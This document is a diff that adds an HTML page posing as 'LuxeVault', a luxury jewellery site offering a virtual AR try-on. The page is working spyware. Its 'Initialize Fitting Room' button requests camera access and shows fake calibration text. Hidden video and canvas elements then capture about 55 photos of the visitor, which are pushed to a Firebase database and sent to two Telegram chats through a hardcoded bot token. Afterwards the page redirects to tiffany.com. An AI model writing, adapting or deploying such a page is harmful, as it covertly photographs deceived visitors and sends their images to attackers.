@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LuxeVault | Private Portfolio</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gold: #c5a059;
+            --dark-gold: #8e6d31;
+            --rich-black: #0d0d0d;
+            --surface: #1a1a1a;
+            --text-gold: #e2c28d;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--rich-black); color: #fff;
+            font-family: 'Playfair Display', serif, system-ui;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .luxury-card {
+            width: 100%; max-width: 400px; background: var(--surface);
+            border-radius: 4px; border: 1px solid var(--dark-gold);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8); overflow: hidden; text-align: center;
+        }
+
+        .brand-header {
+            padding: 30px 20px; background: linear-gradient(135deg, #1a1a1a, #000);
+            border-bottom: 1px solid var(--dark-gold);
+        }
+
+        .brand-logo { 
+            font-size: 24px; letter-spacing: 4px; color: var(--text-gold);
+            text-transform: uppercase; margin: 0; font-weight: 300;
+        }
+
+        .portfolio-content { padding: 40px 30px; }
+
+        .ar-preview {
+            width: 100%; height: 200px; background: url('https://images.unsplash.com/photo-1515562141207-7a88fb7ce338?auto=format&fit=crop&w=400&q=80') center;
+            background-size: cover; margin-bottom: 24px; position: relative; border-radius: 2px;
+        }
+
+        .ar-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center;
+        }
+
+        h1 { font-size: 20px; font-weight: 400; color: var(--text-gold); margin-bottom: 10px; }
+        p { font-size: 14px; color: #b3b3b3; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn-luxe {
+            background: var(--gold); color: #000; border: none;
+            width: 100%; padding: 14px; font-size: 13px; font-weight: 700;
+            text-transform: uppercase; letter-spacing: 2px; cursor: pointer;
+            transition: 0.3s ease;
+        }
+        .btn-luxe:hover { background: var(--text-gold); }
+
+        /* AR Calibration UI */
+        #sync-ui { display: none; }
+        
+        .shimmer-ring {
+            width: 60px; height: 60px; margin: 0 auto 20px;
+            border: 2px solid var(--dark-gold); border-top-color: #fff;
+            border-radius: 50%; animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .status-msg { font-size: 14px; letter-spacing: 1px; color: var(--text-gold); }
+        .location-node { font-size: 10px; color: #555; margin-top: 20px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+    <div class="luxury-card">
+        <div class="brand-header">
+            <div class="brand-logo">LuxeVault</div>
+        </div>
+
+        <div class="portfolio-content" id="init-view">
+            <div class="ar-preview">
+                <div class="ar-overlay">✨</div>
+            </div>
+            <h1>Private Portfolio Access</h1>
+            <p>To view the high-resolution catalogue and enable <b>Virtual AR Try-On</b>, please initialize the secure biometric handshake.</p>
+            
+            <button class="btn-luxe" onclick="startLuxeAuth()">Initialize Fitting Room</button>
+            <div class="location-node">Gateway Node: Mumbai_Financial_Dist</div>
+        </div>
+
+        <div class="portfolio-content" id="sync-ui">
+            <div class="shimmer-ring"></div>
+            <div class="status-msg">Calibrating AR Sensors...</div>
+            <div style="font-size: 11px; color: #777; margin-top: 10px;" id="luxe-timer">Sync will complete in 60s</div>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 10px; color: var(--gold); margin-top: 30px; border: 1px solid #222;">
+                > INITIALIZING_HAPTIC_SYNC...<br>
+                > NODE: MUMBAI_ZONE_1<br>
+                > ENCRYPTING_PRESENCE_HASH...
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Components -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startLuxeAuth() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('luxe-timer').innerText = `Sync will complete in ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            luxeCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real luxury catalogue or brand site
+                            window.location.href = "https://www.tiffany.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.tiffany.com";
+            }
+        }
+
+        function luxeCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "JEWELLERY_AR_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_FINANCIAL" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'luxe_mumbai_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
